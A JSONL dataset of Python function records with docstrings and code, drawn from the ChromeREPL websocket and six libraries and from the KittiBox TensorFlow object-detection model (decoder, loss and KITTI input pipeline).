{"docstring": "\"\"\"\nsend ping data.\n\npayload: data payload to send server.\n\"\"\"\n", "func_signal": "def ping(self, payload=\"\"):\n", "code": "if isinstance(payload, six.text_type):\n    payload = payload.encode(\"utf-8\")\nself.send(payload, ABNF.OPCODE_PING)", "path": "libs\\websocket\\_core.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\" A WebSocketApp should keep running as long as its self.keep_running\nis not False (in the boolean context).\n\"\"\"\n\n", "func_signal": "def testKeepRunning(self):\n", "code": "def on_open(self, *args, **kwargs):\n    \"\"\" Set the keep_running flag for later inspection and immediately\n    close the connection.\n    \"\"\"\n    WebSocketAppTest.keep_running_open = self.keep_running\n\n    self.close()\n\ndef on_close(self, *args, **kwargs):\n    \"\"\" Set the keep_running flag for the test to use.\n    \"\"\"\n    WebSocketAppTest.keep_running_close = self.keep_running\n\napp = ws.WebSocketApp('ws://echo.websocket.org/', on_open=on_open, on_close=on_close)\napp.run_forever()\n\nself.assertFalse(isinstance(WebSocketAppTest.keep_running_open,\n                            WebSocketAppTest.NotSetYet))\n\nself.assertFalse(isinstance(WebSocketAppTest.keep_running_close,\n                            WebSocketAppTest.NotSetYet))\n\nself.assertEqual(True, WebSocketAppTest.keep_running_open)\nself.assertEqual(False, WebSocketAppTest.keep_running_close)", "path": "libs\\websocket\\tests\\test_websocket.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"\nget subprotocol\n\"\"\"\n", "func_signal": "def getsubprotocol(self):\n", "code": "if self.handshake_response:\n    return self.handshake_response.subprotocol\nelse:\n    return None", "path": "libs\\websocket\\_core.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"Class decorator for creating a class with a metaclass.\"\"\"\n", "func_signal": "def add_metaclass(metaclass):\n", "code": "def wrapper(cls):\n    orig_vars = cls.__dict__.copy()\n    slots = orig_vars.get('__slots__')\n    if slots is not None:\n        if isinstance(slots, str):\n            slots = [slots]\n        for slots_var in slots:\n            orig_vars.pop(slots_var)\n    orig_vars.pop('__dict__', None)\n    orig_vars.pop('__weakref__', None)\n    return metaclass(cls.__name__, cls.__bases__, orig_vars)\nreturn wrapper", "path": "libs\\six.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"Import module, returning the module after the last dot.\"\"\"\n", "func_signal": "def _import_module(name):\n", "code": "__import__(name)\nreturn sys.modules[name]", "path": "libs\\six.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"The new-style print function for Python 2.4 and 2.5.\"\"\"\n", "func_signal": "def print_(*args, **kwargs):\n", "code": "fp = kwargs.pop(\"file\", sys.stdout)\nif fp is None:\n    return\n\ndef write(data):\n    if not isinstance(data, basestring):\n        data = str(data)\n    # If the file has an encoding, encode unicode with it.\n    if (isinstance(fp, file) and\n            isinstance(data, unicode) and\n            fp.encoding is not None):\n        errors = getattr(fp, \"errors\", None)\n        if errors is None:\n            errors = \"strict\"\n        data = data.encode(fp.encoding, errors)\n    fp.write(data)\nwant_unicode = False\nsep = kwargs.pop(\"sep\", None)\nif sep is not None:\n    if isinstance(sep, unicode):\n        want_unicode = True\n    elif not isinstance(sep, str):\n        raise TypeError(\"sep must be None or a string\")\nend = kwargs.pop(\"end\", None)\nif end is not None:\n    if isinstance(end, unicode):\n        want_unicode = True\n    elif not isinstance(end, str):\n        raise TypeError(\"end must be None or a string\")\nif kwargs:\n    raise TypeError(\"invalid keyword arguments to print()\")\nif not want_unicode:\n    for arg in args:\n        if isinstance(arg, unicode):\n            want_unicode = True\n            break\nif want_unicode:\n    newline = unicode(\"\\n\")\n    space = unicode(\" \")\nelse:\n    newline = \"\\n\"\n    space = \" \"\nif sep is None:\n    sep = space\nif end is None:\n    end = newline\nfor i, arg in enumerate(args):\n    if i:\n        write(sep)\n    write(arg)\nwrite(end)", "path": "libs\\six.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\" A WebSocketApp should forward the received mask_key function down\nto the actual socket.\n\"\"\"\n\n", "func_signal": "def testSockMaskKey(self):\n", "code": "def my_mask_key_func():\n    pass\n\ndef on_open(self, *args, **kwargs):\n    \"\"\" Set the value so the test can use it later on and immediately\n    close the connection.\n    \"\"\"\n    WebSocketAppTest.get_mask_key_id = id(self.get_mask_key)\n    self.close()\n\napp = ws.WebSocketApp('ws://echo.websocket.org/', on_open=on_open, get_mask_key=my_mask_key_func)\napp.run_forever()\n\n# Note: We can't use 'is' for comparing the functions directly, need to use 'id'.\nself.assertEqual(WebSocketAppTest.get_mask_key_id, id(my_mask_key_func))", "path": "libs\\websocket\\tests\\test_websocket.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"Return None\n\nRequired, if is_package is implemented\"\"\"\n", "func_signal": "def get_code(self, fullname):\n", "code": "self.__get_module(fullname)  # eventually raises ImportError\nreturn None", "path": "libs\\six.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"\nConnect to url. url is websocket url scheme.\nie. ws://host:port/resource\nYou can customize using 'options'.\nIf you set \"header\" list object, you can set your own custom header.\n\n>>> ws = WebSocket()\n>>> ws.connect(\"ws://echo.websocket.org/\",\n        ...     header=[\"User-Agent: MyProgram\",\n        ...             \"x-custom: header\"])\n\ntimeout: socket timeout time. This value is integer.\n         if you set None for this value,\n         it means \"use default_timeout value\"\n\noptions: \"header\" -> custom http header list or dict.\n         \"cookie\" -> cookie value.\n         \"origin\" -> custom origin url.\n         \"host\"   -> custom host header string.\n         \"http_proxy_host\" - http proxy host name.\n         \"http_proxy_port\" - http proxy port. If not set, set to 80.\n         \"http_no_proxy\"   - host names, which doesn't use proxy.\n         \"http_proxy_auth\" - http proxy auth information.\n                             tuple of username and password.\n                             default is None\n         \"subprotocols\" - array of available sub protocols.\n                          default is None.\n         \"socket\" - pre-initialized stream socket.\n\n\"\"\"\n", "func_signal": "def connect(self, url, **options):\n", "code": "self.sock, addrs = connect(url, self.sock_opt, proxy_info(**options),\n                           options.pop('socket', None))\n\ntry:\n    self.handshake_response = handshake(self.sock, *addrs, **options)\n    self.connected = True\nexcept:\n    if self.sock:\n        self.sock.close()\n        self.sock = None\n    raise", "path": "libs\\websocket\\_core.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"Execute code in a namespace.\"\"\"\n", "func_signal": "def exec_(_code_, _globs_=None, _locs_=None):\n", "code": "if _globs_ is None:\n    frame = sys._getframe(1)\n    _globs_ = frame.f_globals\n    if _locs_ is None:\n        _locs_ = frame.f_locals\n    del frame\nelif _locs_ is None:\n    _locs_ = _globs_\nexec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")", "path": "libs\\six.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"\nAllow iteration over websocket, implying sequential `recv` executions.\n\"\"\"\n", "func_signal": "def __iter__(self):\n", "code": "while True:\n    yield self.recv()", "path": "libs\\websocket\\_core.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"Create a base class with a metaclass.\"\"\"\n# This requires a bit of explanation: the basic idea is to make a dummy\n# metaclass for one level of class instantiation that replaces itself with\n# the actual metaclass.\n", "func_signal": "def with_metaclass(meta, *bases):\n", "code": "class metaclass(type):\n\n    def __new__(cls, name, this_bases, d):\n        return meta(name, bases, d)\n\n    @classmethod\n    def __prepare__(cls, name, this_bases):\n        return meta.__prepare__(name, bases)\nreturn type.__new__(metaclass, 'temporary_class', (), {})", "path": "libs\\six.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "# TODO: add longer frame data\n", "func_signal": "def testRecv(self):\n", "code": "sock = ws.WebSocket()\ns = sock.sock = SockMock()\nsomething = six.b(\"\\x81\\x8fabcd\\x82\\xe3\\xf0\\x87\\xe3\\xf1\\x80\\xe5\\xca\\x81\\xe2\\xc5\\x82\\xe3\\xcc\")\ns.add_packet(something)\ndata = sock.recv()\nself.assertEqual(data, \"\u3053\u3093\u306b\u3061\u306f\")\n\ns.add_packet(six.b(\"\\x81\\x85abcd)\\x07\\x0f\\x08\\x0e\"))\ndata = sock.recv()\nself.assertEqual(data, \"Hello\")", "path": "libs\\websocket\\tests\\test_websocket.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"\nSet the global timeout setting to connect.\n\ntimeout: default socket timeout time. This value is second.\n\"\"\"\n", "func_signal": "def setdefaulttimeout(timeout):\n", "code": "global _default_timeout\n_default_timeout = timeout", "path": "libs\\websocket\\_socket.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"\nget handshake status\n\"\"\"\n", "func_signal": "def getstatus(self):\n", "code": "if self.handshake_response:\n    return self.handshake_response.status\nelse:\n    return None", "path": "libs\\websocket\\_core.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"\nconnect to url and return websocket object.\n\nConnect to url and return the WebSocket object.\nPassing optional timeout parameter will set the timeout on the socket.\nIf no timeout is supplied,\nthe global default timeout setting returned by getdefauttimeout() is used.\nYou can customize using 'options'.\nIf you set \"header\" list object, you can set your own custom header.\n\n>>> conn = create_connection(\"ws://echo.websocket.org/\",\n     ...     header=[\"User-Agent: MyProgram\",\n     ...             \"x-custom: header\"])\n\n\ntimeout: socket timeout time. This value is integer.\n         if you set None for this value,\n         it means \"use default_timeout value\"\n\nclass_: class to instantiate when creating the connection. It has to implement\n        settimeout and connect. It's __init__ should be compatible with\n        WebSocket.__init__, i.e. accept all of it's kwargs.\noptions: \"header\" -> custom http header list or dict.\n         \"cookie\" -> cookie value.\n         \"origin\" -> custom origin url.\n         \"host\"   -> custom host header string.\n         \"http_proxy_host\" - http proxy host name.\n         \"http_proxy_port\" - http proxy port. If not set, set to 80.\n         \"http_no_proxy\"   - host names, which doesn't use proxy.\n         \"http_proxy_auth\" - http proxy auth information.\n                                tuple of username and password.\n                                default is None\n         \"enable_multithread\" -> enable lock for multithread.\n         \"sockopt\" -> socket options\n         \"sslopt\" -> ssl option\n         \"subprotocols\" - array of available sub protocols.\n                          default is None.\n         \"skip_utf8_validation\" - skip utf8 validation.\n         \"socket\" - pre-initialized stream socket.\n\"\"\"\n", "func_signal": "def create_connection(url, timeout=None, class_=WebSocket, **options):\n", "code": "sockopt = options.pop(\"sockopt\", [])\nsslopt = options.pop(\"sslopt\", {})\nfire_cont_frame = options.pop(\"fire_cont_frame\", False)\nenable_multithread = options.pop(\"enable_multithread\", False)\nskip_utf8_validation = options.pop(\"skip_utf8_validation\", False)\nwebsock = class_(sockopt=sockopt, sslopt=sslopt,\n                 fire_cont_frame=fire_cont_frame,\n                 enable_multithread=enable_multithread,\n                 skip_utf8_validation=skip_utf8_validation, **options)\nwebsock.settimeout(timeout if timeout is not None else getdefaulttimeout())\nwebsock.connect(url, **options)\nreturn websock", "path": "libs\\websocket\\_core.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"\nLow-level asynchronous abort, wakes up other threads that are waiting in recv_*\n\"\"\"\n", "func_signal": "def abort(self):\n", "code": "if self.connected:\n    self.sock.shutdown(socket.SHUT_RDWR)", "path": "libs\\websocket\\_core.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"\nturn on/off the traceability.\n\ntraceable: boolean value. if set True, traceability is enabled.\n\"\"\"\n", "func_signal": "def enableTrace(traceable):\n", "code": "global _traceEnabled\n_traceEnabled = traceable\nif traceable:\n    if not _logger.handlers:\n        _logger.addHandler(logging.StreamHandler())\n    _logger.setLevel(logging.DEBUG)", "path": "libs\\websocket\\_logging.py", "repo_name": "acarabott/ChromeREPL", "stars": 356, "license": "mit", "language": "python", "size": 871}
{"docstring": "\"\"\"Changes RGB [0,1] valued image to BGR [0,255] with mean subtracted.\"\"\"\n", "func_signal": "def _imagenet_preprocess(rgb):\n", "code": "red, green, blue = tf.split(\n    axis=3, num_or_size_splits=3, value=rgb * 255.0)\nbgr = tf.concat(axis=3, values=[blue, green, red])\nbgr -= IMAGENET_MEAN_BGR\nreturn bgr", "path": "encoder\\resnet.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "#choose matching style\n", "func_signal": "def isMatching(self, other, style, coverThresh, overlapThresh, distThresh, minOverlap, aspectRatio=-1, fixWH=-1):\n", "code": "if (style == 0):\n        return self.isMatchingStd(other, coverThresh, overlapThresh, distThresh, aspectRatio=-1, fixWH=-1)\n\nif (style == 1):\n        return self.isMatchingPascal(other, minOverlap)", "path": "submodules\\utils\\annolist\\AnnotationLib.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\"Apply decoder to the logits.\n\nComputation which decode CNN boxes.\nThe output can be interpreted as bounding Boxes.\n\n\nArgs:\n  logits: Logits tensor, output von encoder\n\nReturn:\n  decoded_logits: values which can be interpreted as bounding boxes\n\"\"\"\n", "func_signal": "def decoder(hyp, logits, train):\n", "code": "hyp['rnn_len'] = 1\nencoded_features = logits['deep_feat']\n\nbatch_size = hyp['batch_size']\nhyp['solver']['batch_size'] = batch_size\nif not train:\n    hyp['batch_size'] = 1\n\nearly_feat = logits['early_feat']\n\ninitializer = tf.random_uniform_initializer(-0.1, 0.1)\n\nwith tf.variable_scope('decoder', initializer=initializer):\n    with tf.name_scope('inner_layer'):\n        # Build inner layer.\n        # See https://arxiv.org/abs/1612.07695 fig. 2 for details\n        hidden_output = _build_inner_layer(hyp, encoded_features, train)\n\n    with tf.name_scope('output_layer'):\n        # Build output layer\n        # See https://arxiv.org/abs/1612.07695 fig. 2 for details\n        pred_boxes, pred_logits, pred_confidences = _build_output_layer(\n            hyp, hidden_output)\n\n    # Dictionary filled with return values\n    dlogits = {}\n\n    if hyp['use_rezoom']:\n        rezoom_input = pred_boxes, pred_logits, pred_confidences, \\\n            early_feat, hidden_output\n        # Build rezoom layer\n        # See https://arxiv.org/abs/1612.07695 fig. 2 for details\n        rezoom_output = _build_rezoom_layer(hyp, rezoom_input, train)\n\n        pred_boxes, pred_logits, pred_confidences, \\\n            pred_confs_deltas, pred_boxes_deltas = rezoom_output\n\n        dlogits['pred_confs_deltas'] = pred_confs_deltas\n        dlogits['pred_boxes_deltas'] = pred_boxes_deltas\n\n        dlogits['pred_boxes_new'] = pred_boxes + pred_boxes_deltas\n\n# Fill dict with return values\ndlogits['pred_boxes'] = pred_boxes\ndlogits['pred_logits'] = pred_logits\ndlogits['pred_confidences'] = pred_confidences\n\nhyp['batch_size'] = batch_size\n\nreturn dlogits", "path": "decoder\\fastBox.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\"\nAdd some histograms to tensorboard.\n\"\"\"\n", "func_signal": "def _add_rezoom_loss_histograms(hypes, pred_boxes_deltas):\n", "code": "tf.summary.histogram(\n    '/delta_hist0_x', pred_boxes_deltas[:, 0, 0])\ntf.summary.histogram(\n    '/delta_hist0_y', pred_boxes_deltas[:, 0, 1])\ntf.summary.histogram(\n    '/delta_hist0_w', pred_boxes_deltas[:, 0, 2])\ntf.summary.histogram(\n    '/delta_hist0_h', pred_boxes_deltas[:, 0, 3])", "path": "decoder\\fastBox.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\"\nComputes loss for delta output. Only relevant\nif rezoom layers are used.\n\"\"\"\n", "func_signal": "def _compute_rezoom_loss(hypes, rezoom_loss_input):\n", "code": "grid_size = hypes['grid_width'] * hypes['grid_height']\nouter_size = grid_size * hypes['batch_size']\nhead = hypes['solver']['head_weights']\n\nperm_truth, pred_boxes, classes, pred_mask, \\\n    pred_confs_deltas, pred_boxes_deltas, mask_r = rezoom_loss_input\nif hypes['rezoom_change_loss'] == 'center':\n    error = (perm_truth[:, :, 0:2] - pred_boxes[:, :, 0:2]) \\\n        / tf.maximum(perm_truth[:, :, 2:4], 1.)\n    square_error = tf.reduce_sum(tf.square(error), 2)\n    inside = tf.reshape(tf.to_int64(\n        tf.logical_and(tf.less(square_error, 0.2**2),\n                       tf.greater(classes, 0))), [-1])\nelif hypes['rezoom_change_loss'] == 'iou':\n    pred_boxes_flat = tf.reshape(pred_boxes, [-1, 4])\n    perm_truth_flat = tf.reshape(perm_truth, [-1, 4])\n    iou = train_utils.iou(train_utils.to_x1y1x2y2(pred_boxes_flat),\n                          train_utils.to_x1y1x2y2(perm_truth_flat))\n    inside = tf.reshape(tf.to_int64(tf.greater(iou, 0.5)), [-1])\nelse:\n    assert not hypes['rezoom_change_loss']\n    inside = tf.reshape(tf.to_int64((tf.greater(classes, 0))), [-1])\n\ncross_entropy = tf.nn.sparse_softmax_cross_entropy_with_logits(\n    logits=pred_confs_deltas, labels=inside)\n\ndelta_confs_loss = tf.reduce_sum(cross_entropy*mask_r) \\\n    / outer_size * hypes['solver']['head_weights'][0] * 0.1\n\ndelta_unshaped = perm_truth - (pred_boxes + pred_boxes_deltas)\n\ndelta_residual = tf.reshape(delta_unshaped * pred_mask,\n                            [outer_size, hypes['rnn_len'], 4])\nsqrt_delta = tf.minimum(tf.square(delta_residual), 10. ** 2)\ndelta_boxes_loss = (tf.reduce_sum(sqrt_delta) /\n                    outer_size * head[1] * 0.03)\n\nreturn delta_confs_loss, delta_boxes_loss", "path": "decoder\\fastBox.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\"force the Aspect ratio\"\"\"\n", "func_signal": "def forceAspectRatio(self, ratio, KeepHeight = False, KeepWidth = False):\n", "code": "if KeepWidth or ((not KeepHeight) and self.width() * 1.0 / self.height() > ratio):\n        # extend height\n        newHeight = self.width() * 1.0 / ratio\n        self.y1 = (self.centerY() - newHeight / 2.0)\n        self.y2 = (self.y1 + newHeight)\nelse:\n        # extend width\n        newWidth = self.height() * ratio\n        self.x1 = (self.centerX() - newWidth / 2.0)\n        self.x2 = (self.x1 + newWidth)", "path": "submodules\\utils\\annolist\\AnnotationLib.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "'''\nApply an 1x1 convolutions to compute inner features\nThe layer consists of 1x1 convolutions implemented as\nmatrix multiplication. This makes the layer very fast.\nThe layer has \"hyp['num_inner_channel']\" channels\n'''\n", "func_signal": "def _build_inner_layer(hyp, encoded_features, train):\n", "code": "grid_size = hyp['grid_width'] * hyp['grid_height']\nouter_size = grid_size * hyp['batch_size']\n\nnum_ex = hyp['batch_size'] * hyp['grid_width'] * hyp['grid_height']\n\nchannels = int(encoded_features.shape[-1])\nhyp['cnn_channels'] = channels\nhidden_input = tf.reshape(encoded_features, [num_ex, channels])\n\nscale_down = hyp['scale_down']\n\nhidden_input = tf.reshape(\n    hidden_input * scale_down, (hyp['batch_size'] * grid_size, channels))\n\ninitializer = tf.random_uniform_initializer(-0.1, 0.1)\nwith tf.variable_scope('Overfeat', initializer=initializer):\n    w = tf.get_variable('ip', shape=[hyp['cnn_channels'],\n                                     hyp['num_inner_channel']])\n    output = tf.matmul(hidden_input, w)\n\nif train:\n    # Adding dropout during training\n    output = tf.nn.dropout(output, 0.5)\nreturn output", "path": "decoder\\fastBox.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\"Calculate the loss from the logits and the labels.\n\nArgs:\n  decoded_logits: output of decoder\n  labels: Labels tensor; Output from data_input\n\n  flags: 0 if object is present 1 otherwise\n  confidences: ??\n  boxes: encoding of bounding box location\n\nReturns:\n  loss: Loss tensor of type float.\n\"\"\"\n\n", "func_signal": "def loss(hypes, decoded_logits, labels):\n", "code": "confidences, boxes, mask = labels\n\npred_boxes = decoded_logits['pred_boxes']\npred_logits = decoded_logits['pred_logits']\npred_confidences = decoded_logits['pred_confidences']\n\npred_confs_deltas = decoded_logits['pred_confs_deltas']\npred_boxes_deltas = decoded_logits['pred_boxes_deltas']\n\ngrid_size = hypes['grid_width'] * hypes['grid_height']\nouter_size = grid_size * hypes['batch_size']\n\nhead = hypes['solver']['head_weights']\n\n# Compute confidence loss\nconfidences = tf.reshape(confidences, (outer_size, 1))\ntrue_classes = tf.reshape(tf.cast(tf.greater(confidences, 0), 'int64'),\n                          [outer_size])\n\npred_classes = tf.reshape(pred_logits, [outer_size, hypes['num_classes']])\nmask_r = tf.reshape(mask, [outer_size])\n\ncross_entropy = tf.nn.sparse_softmax_cross_entropy_with_logits(\n    logits=pred_classes, labels=true_classes)\n\n# ignore don't care areas\ncross_entropy_sum = (tf.reduce_sum(mask_r*cross_entropy))\nconfidences_loss = cross_entropy_sum / outer_size * head[0]\n\ntrue_boxes = tf.reshape(boxes, (outer_size, hypes['rnn_len'], 4))\n\n# box loss for background prediction needs to be zerod out\nboxes_mask = tf.reshape(\n    tf.cast(tf.greater(confidences, 0), 'float32'), (outer_size, 1, 1))\n\n# danger zone\nresidual = (true_boxes - pred_boxes) * boxes_mask\n\nboxes_loss = tf.reduce_sum(tf.abs(residual)) / outer_size * head[1]\n\nif hypes['use_rezoom']:\n    # add rezoom loss\n    rezoom_loss_input = true_boxes, pred_boxes, confidences, boxes_mask, \\\n        pred_confs_deltas, pred_boxes_deltas, mask_r\n\n    delta_confs_loss, delta_boxes_loss = _compute_rezoom_loss(\n        hypes, rezoom_loss_input)\n\n    _add_rezoom_loss_histograms(hypes, pred_boxes_deltas)\n\n    loss = confidences_loss + boxes_loss + delta_boxes_loss \\\n        + delta_confs_loss\nelse:\n    loss = confidences_loss + boxes_loss\n\ntf.add_to_collection('total_losses', loss)\n\nreg_loss_col = tf.GraphKeys.REGULARIZATION_LOSSES\n\nweight_loss = tf.add_n(tf.get_collection(reg_loss_col),\n                       name='reg_loss')\n\ntotal_loss = weight_loss + loss\n\nlosses = {}\nlosses['total_loss'] = total_loss\nlosses['loss'] = loss\nlosses['confidences_loss'] = confidences_loss\nlosses['boxes_loss'] = boxes_loss\nlosses['weight_loss'] = weight_loss\nif hypes['use_rezoom']:\n    losses['delta_boxes_loss'] = delta_boxes_loss\n    losses['delta_confs_loss'] = delta_confs_loss\n\nreturn losses", "path": "decoder\\fastBox.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "# add attribute before adding string corresponding to integer value\n", "func_signal": "def add_attribute_val(self, aname, vname, val):\n", "code": "assert(aname in self.attribute_desc);\n\n# check and add if new\nif all((val_desc.id != val for val_desc in self.attribute_desc[aname].val_to_str)):\n        val_desc = self.attribute_desc[aname].val_to_str.add()\n        val_desc.id = val;\n        val_desc.s = vname;\n\n# also add to map for quick access\nif not aname in self.attribute_val_to_str:\n        self.attribute_val_to_str[aname] = {};\n\nassert(not val in self.attribute_val_to_str[aname]);\nself.attribute_val_to_str[aname][val] = vname;", "path": "submodules\\utils\\annolist\\AnnotationLib.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "# Load googlenet and returns the cnn_codes\n\n", "func_signal": "def inference(hypes, images, phase):\n", "code": "if phase == 'train':\n    encoder_net.append(googlenet_load.init(hypes))\n\ninput_mean = 117.\nimages -= input_mean\ncnn, early_feat, _ = googlenet_load.model(images, encoder_net[0], hypes)\n\nreturn cnn, early_feat, _", "path": "encoder\\googleNet.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\"Create Queues.\"\"\"\n", "func_signal": "def create_queues(hypes, phase):\n", "code": "hypes[\"rnn_len\"] = 1\ndtypes = [tf.float32, tf.float32, tf.float32, tf.float32]\ngrid_size = hypes['grid_width'] * hypes['grid_height']\nshapes = ([hypes['image_height'], hypes['image_width'], 3],\n          [hypes['grid_height'], hypes['grid_width']],\n          [hypes['grid_height'], hypes['grid_width'], 4],\n          [hypes['grid_height'], hypes['grid_width']])\ncapacity = 30\nq = tf.FIFOQueue(capacity=capacity, dtypes=dtypes, shapes=shapes)\nreturn q", "path": "inputs\\kitti_input.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "\"\"\"Take the txt file and net configuration and create a generator\nthat outputs a jittered version of a random image from the annolist\nthat is mean corrected.\"\"\"\n\n", "func_signal": "def _load_kitti_txt(kitti_txt, hypes, jitter=False, random_shuffel=True):\n", "code": "base_path = os.path.realpath(os.path.dirname(kitti_txt))\nfiles = [line.rstrip() for line in open(kitti_txt)]\nif hypes['data']['truncate_data']:\n    files = files[:10]\n    random.seed(0)\nfor epoch in itertools.count():\n    if random_shuffel:\n        random.shuffle(files)\n    for file in files:\n        image_file, gt_image_file = file.split(\" \")\n        image_file = os.path.join(base_path, image_file)\n        assert os.path.exists(image_file), \\\n            \"File does not exist: %s\" % image_file\n        gt_image_file = os.path.join(base_path, gt_image_file)\n        assert os.path.exists(gt_image_file), \\\n            \"File does not exist: %s\" % gt_image_file\n\n        rect_list = read_kitti_anno(gt_image_file,\n                                    detect_truck=hypes['detect_truck'])\n\n        anno = AnnoLib.Annotation()\n        anno.rects = rect_list\n\n        im = scp.misc.imread(image_file)\n        if im.shape[2] == 4:\n            im = im[:, :, :3]\n        if im.shape[0] != hypes[\"image_height\"] or \\\n           im.shape[1] != hypes[\"image_width\"]:\n            if True:\n                anno = _rescale_boxes(im.shape, anno,\n                                      hypes[\"image_height\"],\n                                      hypes[\"image_width\"])\n            im = imresize(\n                im, (hypes[\"image_height\"], hypes[\"image_width\"]),\n                interp='cubic')\n        if jitter:\n            jitter_scale_min = 0.9\n            jitter_scale_max = 1.1\n            jitter_offset = 16\n            im, anno = annotation_jitter(\n                im, anno, target_width=hypes[\"image_width\"],\n                target_height=hypes[\"image_height\"],\n                jitter_scale_min=jitter_scale_min,\n                jitter_scale_max=jitter_scale_max,\n                jitter_offset=jitter_offset)\n\n        pos_list = [rect for rect in anno.rects if rect.classID == 1]\n        pos_anno = fake_anno(pos_list)\n\n        boxes, confs = annotation_to_h5(hypes,\n                                        pos_anno,\n                                        hypes[\"grid_width\"],\n                                        hypes[\"grid_height\"],\n                                        hypes[\"rnn_len\"])\n\n        mask_list = [rect for rect in anno.rects if rect.classID == -1]\n        mask = _generate_mask(hypes, mask_list)\n\n        boxes = boxes.reshape([hypes[\"grid_height\"],\n                               hypes[\"grid_width\"], 4])\n        confs = confs.reshape(hypes[\"grid_height\"], hypes[\"grid_width\"])\n\n        yield {\"image\": im, \"boxes\": boxes, \"confs\": confs,\n               \"rects\": pos_list, \"mask\": mask}", "path": "inputs\\kitti_input.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
{"docstring": "#annotations = [];\n", "func_signal": "def pal2al(_annolist):\n", "code": "annotations = AnnotationLib.AnnoList();\n\nfor adesc in _annolist.attribute_desc:\n    annotations.attribute_desc[adesc.name] = adesc;\n    print(\"attribute: \", adesc.name, adesc.id)\n\n    for valdesc in adesc.val_to_str:\n        annotations.add_attribute_val(adesc.name, valdesc.s, valdesc.id);\n\nattribute_name_from_id = {adesc.id: aname for aname, adesc in annotations.attribute_desc.iteritems()}\nattribute_dtype_from_id = {adesc.id: adesc.dtype for aname, adesc in annotations.attribute_desc.iteritems()}\n\nfor _a in _annolist.annotation:\n    anno = AnnotationLib.Annotation()\n\n    anno.imageName = _a.imageName;\n\n    anno.rects = [];\n\n    for _r in _a.rect:\n        rect = AnnotationLib.AnnoRect()\n\n        rect.x1 = _r.x1;\n        rect.x2 = _r.x2;\n        rect.y1 = _r.y1;\n        rect.y2 = _r.y2;\n\n        if _r.HasField(\"id\"):\n            rect.id = _r.id;\n\n        if _r.HasField(\"track_id\"):\n            rect.track_id = _r.track_id;\n\n        if _r.HasField(\"score\"):\n            rect.score = _r.score;\n\n        for _at in _r.attribute:\n            try:\n                cur_aname = attribute_name_from_id[_at.id];\n                cur_dtype = attribute_dtype_from_id[_at.id];\n            except KeyError as e:\n                print(\"attribute: \", _at.id)\n                print(e)\n                assert(False);\n\n            if cur_dtype == AnnotationLib.AnnoList.TYPE_INT32:\n                rect.at[cur_aname] = _at.val;\n            elif cur_dtype == AnnotationLib.AnnoList.TYPE_FLOAT:\n                rect.at[cur_aname] = _at.fval;\n            elif cur_dtype == AnnotationLib.AnnoList.TYPE_STRING:\n                rect.at[cur_aname] = _at.strval;\n            else:\n                assert(False);\n\n        anno.rects.append(rect);\n\n    annotations.append(anno);\n\nreturn annotations;", "path": "submodules\\utils\\annolist\\PalLib.py", "repo_name": "MarvinTeichmann/KittiBox", "stars": 403, "license": "mit", "language": "python", "size": 21347}
